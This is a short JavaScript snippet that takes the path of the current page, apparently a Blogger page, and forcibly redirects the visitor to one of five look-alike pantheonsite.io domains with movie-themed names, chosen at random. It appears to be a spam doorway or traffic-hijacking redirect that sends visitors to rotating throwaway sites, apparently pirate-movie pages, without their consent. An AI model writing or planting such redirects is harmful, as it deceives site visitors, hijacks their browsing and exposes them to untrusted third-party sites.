var urlmain = document.URL;
var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
var dataUrl = [

"https://dev-neomoviefj.pantheonsite.io/register.php?do=search&q",
"https://dev-filmflixss.pantheonsite.io/",
"https://dev-neoflimfj.pantheonsite.io/register.php?do=search&q",
"https://dev-neofilmfj.pantheonsite.io/register.php?do=search&q",
"https://dev-filmfj.pantheonsite.io/"

];
var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
window.location = randomItem + param;
